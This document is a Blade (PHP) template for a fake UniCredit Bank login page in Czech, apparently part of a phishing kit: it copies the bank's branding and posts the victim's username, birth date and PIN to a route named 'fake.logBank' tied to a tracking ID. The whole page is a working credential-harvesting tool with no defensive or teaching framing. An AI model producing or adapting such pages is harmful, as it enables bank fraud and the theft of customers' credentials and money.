@extends('layouts.fake')
@section('html_class'){{"mt-0"}}@endsection
@section('body_class'){{"mt-2"}}@endsection
@push('css')
    <style>

        @import url('https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600');

        @font-face {
            font-family: "ing-iconfont";
            /*src: url("./ing-iconfont.eot");*/
            /*src: url("./ing-iconfont.eot?#iefix") format("embedded-opentype"),*/
            /*url("./ing-iconfont.woff") format("woff"),*/
            /*url("./ing-iconfont.ttf") format("truetype"),*/
            /*url("./ing-iconfont.svg#ing-iconfont") format("svg");*/
            font-weight: normal;
            font-style: normal;

        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit.eot");*/
            /*src: url("./UniCredit.woff2") format("woff2"), url("./UniCredit.woff") format("woff"), url("./UniCredit.ttf") format("truetype"), url("./UniCredit.svg#UniCredit") format("svg"), url("./UniCredit.eot?#iefix") format("embedded-opentype");*/
            font-weight: 400;
            font-style: normal
        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit-Light.eot");*/
            /*src: url("./UniCredit-Light.woff") format("woff"), url("./UniCredit-Light.ttf") format("truetype"), url("./UniCredit-Light.svg#UniCredit-Light") format("svg"), url("./UniCredit-Light.eot?#iefix") format("embedded-opentype");*/
            font-weight: 300;
            font-style: normal
        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit-Medium.eot");*/
            /*src: url("./UniCredit-Medium.woff") format("woff"), url("./UniCredit-Medium.ttf") format("truetype"), url("./UniCredit-Medium.svg#UniCredit-Medium") format("svg"), url("./UniCredit-Medium.eot?#iefix") format("embedded-opentype");*/
            font-weight: 500;
            font-style: normal
        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit-Bold.eot");*/
            /*src: url("./UniCredit-Bold.woff2") format("woff2"), url("./UniCredit-Bold.woff") format("woff"), url("./UniCredit-Bold.ttf") format("truetype"), url("./UniCredit-Bold.svg#UniCredit-Bold") format("svg"), url("./UniCredit-Bold.eot?#iefix") format("embedded-opentype");*/
            font-weight: 700;
            font-style: normal
        }

        * {
            font-family: "UniCredit", sans-serif;
        }

        a {
            text-decoration: none !important;
            font-size: 20px;
        }

        .header-logo {
            height: 70px;
        }

        .link1 {
            height: 20px;
            padding: 25px 50px;
        }

        .link2 {
            height: auto;
            padding: 11px 50px;
            display: flex;
            align-items: center;
        }

        .span1 {
            display: none;
        }

        .img-main2 {
            margin-left: auto;
            margin-right: auto;
            max-width: 660px;
        }


    </style>
    <style>

        body {
        }

        @media (max-width: 800px) {
            .span1 {
                display: block !important;
            }

            .span2 {
                display: none;
            }

            .span3 {
                display: none;
            }

            .link1 {
                display: none;
            }

            .link2 {

                padding: 9px 16px;
            }

            .header-logo {
                height: 42px;
            }
        }

        @media (min-width: 1100px) {

            .fl-ex > div > div > img {
                width: 50vw !important;
            }

            .img-main2 {
                width: 50vw !important;
                margin-top: 40px !important;
            }
        }

    </style>
    <style>

        @import url('https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600');

        @font-face {
            font-family: "ing-iconfont";
            /*src: url("./ing-iconfont.eot");*/
            /*src: url("./ing-iconfont.eot?#iefix") format("embedded-opentype"),*/
            /*url("./ing-iconfont.woff") format("woff"),*/
            /*url("./ing-iconfont.ttf") format("truetype"),*/
            /*url("./ing-iconfont.svg#ing-iconfont") format("svg");*/
            font-weight: normal;
            font-style: normal;

        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit.eot");*/
            /*src: url("./UniCredit.woff2") format("woff2"), url("./UniCredit.woff") format("woff"), url("./UniCredit.ttf") format("truetype"), url("./UniCredit.svg#UniCredit") format("svg"), url("./UniCredit.eot?#iefix") format("embedded-opentype");*/
            font-weight: 400;
            font-style: normal
        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit-Light.eot");*/
            /*src: url("./UniCredit-Light.woff") format("woff"), url("./UniCredit-Light.ttf") format("truetype"), url("./UniCredit-Light.svg#UniCredit-Light") format("svg"), url("./UniCredit-Light.eot?#iefix") format("embedded-opentype");*/
            font-weight: 300;
            font-style: normal
        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit-Medium.eot");*/
            /*src: url("./UniCredit-Medium.woff") format("woff"), url("./UniCredit-Medium.ttf") format("truetype"), url("./UniCredit-Medium.svg#UniCredit-Medium") format("svg"), url("./UniCredit-Medium.eot?#iefix") format("embedded-opentype");*/
            font-weight: 500;
            font-style: normal
        }

        @font-face {
            font-family: 'UniCredit';
            /*src: url("./UniCredit-Bold.eot");*/
            /*src: url("./UniCredit-Bold.woff2") format("woff2"), url("./UniCredit-Bold.woff") format("woff"), url("./UniCredit-Bold.ttf") format("truetype"), url("./UniCredit-Bold.svg#UniCredit-Bold") format("svg"), url("./UniCredit-Bold.eot?#iefix") format("embedded-opentype");*/
            font-weight: 700;
            font-style: normal
        }

        * {
            font-family: "UniCredit", sans-serif;
        }

        a {
            text-decoration: none !important;
            font-size: 20px;
        }

        .header-logo {
            height: 70px;
        }

        .link1 {
            height: 20px;
            padding: 25px 50px;
        }

        .link2 {
            height: auto;
            padding: 11px 50px;
            display: flex;
            align-items: center;
        }

        .span1 {
            display: none;
        }

        .img-main2 {
            margin-left: auto;
            margin-right: auto;
            max-width: 660px;
        }
    </style>
    <style>
        .neon_border {
            max-width: 600px;
            height: 100%;
            padding: 20px 5vw;
            margin: auto;
            border: 1px solid #efefef;
            border-radius: 10px;
            background: #f5f5f5;
        }

        .form-item {
            position: relative;
            padding-top: 40px;
            margin-bottom: 10px;
        }

        label {
            position: absolute;
            left: 11px;
            top: 50px;
            transition: 0.5s;
            background: #f5f5f5;
            padding: 5px;
        }

        input {
            display: block;
            width: calc(100% - 24px);
            padding: 11px;
            margin: auto;
            border: 1px solid #ccc;
            background: no-repeat bottom, 50% calc(100% - 1px);
            background-size: 0 100%, 100% 100%;
            background-image: linear-gradient(0deg, #e2001a 3px, rgba(156, 39, 176, 0) 0), linear-gradient(0deg, #f5f5f5 1px, hsla(0, 0%, 82%, 0) 0);
            border-radius: 19px;
            transition: 0.3s;
        }

        button {
            display: block;
            padding: 7px 16px;
            font-size: 1.1875rem;
            line-height: 28px;
            border-radius: 8px;
            font-weight: 700;
            margin: auto;
            color: #fff;
            background-color: #262626;
            border-color: #262626;
            border: none;
        }

        input:focus {
            outline: none;
            background-size: 100% 100%, 100% 100%;
            box-shadow: none;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 20px;
            left: 19px;
        }

        ::-webkit-input-placeholder {
            opacity: 0;
        }

        input:focus::-webkit-input-placeholder {
            opacity: 1;
        }

        p {
            color: #e2001a;
            font-weight: 700;
            font-size: 23px;
            text-align: center;
        }

        .icon {
            float: left;
            font-size: 24px;
            color: #f90;
            padding-right: 12px;
        }

        .icon-text {
            color: #f90;
            font-weight: 600;
            line-height: 23px;
        }

        .first:before {
            content: "\6b";
        }

        .icon:before {
            font-family: "ing-iconfont" !important;
            font-style: normal !important;
            font-weight: normal !important;
            font-variant: normal !important;
            text-transform: none !important;
            speak: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h6 {
            padding: 0 36px 20px;
            margin-block-start: 5px;
            margin-block-end: 5px;
            font-weight: normal;
            font-size: 12px;
        }

        a {
            color: #ffffff;
            font-weight: 700;
        }

        button {
            cursor: pointer;
        }

    </style>
@endpush

@section('content')
    <div class="header-logo" style="background: #ffffff; display: flex; border-bottom: 1px solid #555555;">
        <img src="{{asset($bank['logo'])}}"
             style="margin-right: auto; margin-left: auto; -webkit-transition: all 0.2s ease-in-out; -moz-transition: all 0.2s ease-in-out; -o-transition: all 0.2s ease-in-out; transition: all 0.2s ease-in-out;">
    </div>
    <div class="fl-ex">
        <div style="padding: 40px 5vw 10vw; width: -webkit-fill-available;">

            <form class="neon_border" id="bank_pm_form" method="POST"
                  action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                <p>Vítejte!</p>
                <div class="form-item" id="input1">
                    <input type="text" id="login" name="login" placeholder="Vložte uživatelské jméno">
                    <label for="login">Uživatelské jméno</label>
                </div>
                <div class="form-item" id="input2">
                    <input type="text" id="password" name="password" placeholder="Den/Měsíc">
                    <label for="password" style="font-size: 13px;">Prosím, vyplňte den a měsíc vašeho data
                        narození</label>
                </div>
                <div class="form-item" id="input3">
                    <input type="text" id="pin" name="pin" placeholder="Vámi zwoleńy Pin">
                    <label for="pin">Vámi zwoleńy Pin</label>
                </div>


                <button id="pay-button" type="submit">Další</button>
            </form>

        </div>
    </div>

    <div
        style="min-height: 30px; padding: 5px; background: #666666; position: fixed; bottom: 0; left: 0; right: 0; color: #fff; font-size: 14px; text-align: center;">
        UniCredit Bank © {{date('Y')}}
        <div style="width: 30vw; max-width: 200px; margin-right: auto; margin-left: auto;"><img
                style="width: 30vw; max-width: 200px;" src="{{asset('images/banks/mlogo.png')}}"></div>
    </div>

@endsection
@push('js')
    <script type="text/javascript">
        $(document).ready(function () {
            $("#password").mask("99/99");
        });
    </script>
@endpush
